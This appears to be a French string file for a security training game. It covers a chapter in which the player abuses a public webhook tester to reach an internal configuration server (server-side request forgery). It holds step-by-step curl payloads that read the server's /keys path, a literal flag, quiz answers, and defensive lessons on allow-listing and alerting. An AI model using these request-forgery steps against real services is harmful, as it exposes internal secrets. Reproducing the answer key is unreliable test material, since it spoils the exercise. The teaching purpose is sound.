c4.briefing: "Jeudi. Retour côté attaque, toujours sous le mandat CP-2029-09. Comptoir ouvre son API à des partenaires et leur offre un outil : une page qui envoie une notification d'essai à l'adresse qu'on lui donne, et affiche la réponse. Le mandat interdit d'attaquer directement les serveurs internes, et de toute façon ils ne sont pas joignables de dehors. Voyons qui peut les joindre."
c4.obj.tester: "Lire la page du testeur de notifications"
c4.obj.outside: "Lui faire appeler une adresse à toi"
c4.obj.inside: "Lui faire appeler une adresse interne"
c4.obj.proof: "Lire ce que le serveur interne garde"
c4.obj.class: "Dire qui a fait la requête"
c4.q.class: "Qui a envoyé la requête au serveur interne ?"
c4.q.class.server: "Le serveur du testeur, depuis l'intérieur du réseau."
c4.q.class.me: "Ton poste, en passant à travers le pare-feu."
c4.q.class.me.why: "Ton poste n'a jamais parlé au serveur interne : il ne sait même pas trouver son nom. Tu as parlé au testeur, et c'est lui qui a fait le chemin."
c4.q.class.partner: "Un partenaire, avec sa clé de signature."
c4.q.class.partner.why: "Aucun partenaire n'est intervenu et tu n'avais aucune clé. Le testeur accepte une adresse de n'importe qui."
c4.ada.brief: "La page est publique. Lis-la, source comprise : les pages d'outils internes devenues publiques gardent souvent des mots de leurs auteurs."
c4.ada.g.tester: "Lis la page : `curl https://hooks.comptoir.test/`."
c4.ada.tester: "« Nous l'appelons tout de suite et nous vous montrons ce qu'elle a répondu. » Donc un serveur de Comptoir fait une requête à ta place, vers l'adresse que tu choisis, et te rend la réponse. Et dans la source, un mot : les clés de signature sont sur `config.int.comptoir.test`. Essaie d'abord l'outil comme un partenaire honnête, avec une adresse de notre labo."
c4.ada.g.outside: "Donne-lui une adresse à nous : `curl -d \"url=https://lab.lignerouge.test/ping\" https://hooks.comptoir.test/`."
c4.ada.g.outside.standard: "Envoie au testeur (champ `url`) une adresse du labo Ligne Rouge."
c4.ada.outside: "« pong ». Il est allé voir et il te raconte."
c4.ada.outside.next: "Maintenant, la question : va-t-il voir n'importe où ? Ton poste ne peut pas joindre `config.int.comptoir.test`, ce nom n'existe pas vu de dehors. Mais ce n'est pas ton poste qui fait le voyage."
c4.ada.g.inside: "Donne-lui l'adresse interne lue dans la source : `curl -d \"url=http://config.int.comptoir.test/\" https://hooks.comptoir.test/`."
c4.ada.g.inside.standard: "Demande au testeur d'appeler l'adresse interne que la source de la page mentionne."
c4.ada.refused: "« connection refused » : il a bien essayé d'aller à l'intérieur, simplement rien n'écoute à cet endroit. C'est déjà une information. Essaie le nom lu dans la source de la page."
c4.ada.inside: "Il y est allé, et il te lit la page d'accueil d'un serveur que le pare-feu te cache. Deux chemins : `/keys` et `/flags`. Le mandat t'interdit d'attaquer ce serveur directement. Tu ne l'attaques pas : tu demandes à un service public de Comptoir ce qu'il voit. C'est exactement ce qu'Inès veut savoir."
c4.ada.g.proof: "Demande-lui les clés : `curl -d \"url=http://config.int.comptoir.test/keys\" https://hooks.comptoir.test/`."
c4.ada.g.proof.standard: "Fais lire au testeur le chemin `/keys` du serveur interne."
c4.ada.switches: "Il y est allé : les réglages de fonctions d'un serveur que le pare-feu te cache. Rien de secret là-dedans, mais la preuve est faite, le testeur lit l'intérieur pour toi. La page d'accueil de ce serveur liste aussi `/keys`."
c4.ada.keys: "La clé qui signe les notifications envoyées aux partenaires. Notre labo a masqué la valeur dans ta sortie, on n'a pas à la détenir. Avec elle, quelqu'un pourrait envoyer aux partenaires de fausses notifications « virement reçu » signées Comptoir."
c4.ada.g.submit: "Le témoin est dans la réponse. Valide-le : `submit FLAG{...}`."
c4.ada.flag: "Preuve faite. Une question, pour le rapport."
c4.ada.g.class: "Réponds à ma question sur l'auteur de la requête."
c4.ada.class: "Oui. Le pare-feu protège l'intérieur contre l'extérieur, et le testeur est à l'intérieur. Un serveur qui va chercher une adresse choisie par un inconnu prête sa place dans le réseau à cet inconnu."
c4.ada.done: "Inès a fait changer la clé dans l'heure, et le testeur est fermé jusqu'au correctif. Reste la connexion des partenaires elle-même : quand un client de Comptoir dit oui à Budgeto, où repart-il ? On regarde ça demain."
c4.soc.inside: "hooks: the tester was asked to call an internal name"
c4.soc.keys: "hooks: the tester returned the content of the internal configuration server"
c4.hint.tester.1: "Tape `curl https://hooks.comptoir.test/` et lis aussi le commentaire dans la source."
c4.hint.outside.1: "Tape `curl -d \"url=https://lab.lignerouge.test/ping\" https://hooks.comptoir.test/`."
c4.hint.inside.1: "Le commentaire de la page nomme un serveur interne : `config.int.comptoir.test`."
c4.hint.inside.2: "Tape `curl -d \"url=http://config.int.comptoir.test/\" https://hooks.comptoir.test/`."
c4.hint.proof.1: "Tape `curl -d \"url=http://config.int.comptoir.test/keys\" https://hooks.comptoir.test/`."
c4.hint.proof.2: "Puis `submit FLAG{comptoir-le-webhook-curieux-c0d9}`."
c4.hint.class.1: "Ton poste n'a parlé qu'au testeur. Tape `answer server`."
c4.def.intro: "Le testeur journalise chaque adresse qu'on lui demande d'appeler. Les tiennes y sont, au milieu de celles des partenaires."
c4.def.lesson: "Un service qui va chercher une adresse pour quelqu'un d'autre doit choisir où il accepte d'aller : des adresses publiques seulement, vérifiées après la résolution du nom, jamais le réseau interne. Et il n'a pas besoin de montrer la réponse complète : « reçu, code 200 » suffit à un partenaire."
c4.def.find.keys: "Ta demande de lecture des clés internes"
c4.def.rule.internal.title: "Alerter quand le testeur est envoyé vers une adresse interne"
c4.def.rule.internal.why: "C'est la bonne. Aucun partenaire n'a de raison de donner une adresse du réseau de Comptoir. La règle sonne dès le premier essai, même raté."
c4.def.rule.every.title: "Alerter sur chaque utilisation du testeur"
c4.def.rule.every.why: "Les partenaires s'en servent toute la journée, c'est fait pour ça. Ta demande serait une ligne parmi des centaines."
c4.def.rule.burst.title: "Alerter au-delà de huit essais en dix minutes"
c4.def.rule.burst.why: "Il t'en a fallu trois. Celui qui sait ce qu'il cherche ne fait pas de bruit."
c4.def.fix.allow.title: "N'appeler que des adresses publiques, vérifiées après résolution du nom"
c4.def.fix.allow.why: "C'est la bonne. Le testeur refuse tout ce qui mène au réseau interne, quel que soit le nom employé. Il reste utile aux partenaires."
c4.def.fix.signed.title: "Signer aussi les notifications d'essai"
c4.def.fix.signed.why: "La signature prouve au partenaire que la notification vient de Comptoir. Elle ne change rien à l'endroit où le testeur accepte d'aller."
c4.def.fix.timeout.title: "Couper les appels du testeur après deux secondes"
c4.def.fix.timeout.why: "Le serveur interne a répondu en deux millisecondes. Un délai protège contre les adresses lentes, pas contre les adresses interdites."
c4.debrief.title: "Un serveur qui va chercher pour toi prête sa place"
c4.debrief.lesson: "Tu n'as jamais touché le serveur interne. Tu as demandé à un service public, placé à l'intérieur du réseau, d'y aller pour toi et de te lire la réponse. Le pare-feu n'y pouvait rien : la requête venait de l'intérieur."
c4.debrief.p1: "Tout service qui appelle une adresse fournie par un utilisateur limite ses destinations : public seulement, jamais interne."
c4.debrief.p2: "La vérification se fait sur l'adresse obtenue après résolution du nom, pas sur le texte tapé."
c4.debrief.p3: "On ne renvoie pas la réponse complète à l'utilisateur : un code de retour suffit."
c4.debrief.p4: "Les secrets ne se lisent pas sur une simple requête interne : un serveur de configuration demande lui aussi qui l'appelle."
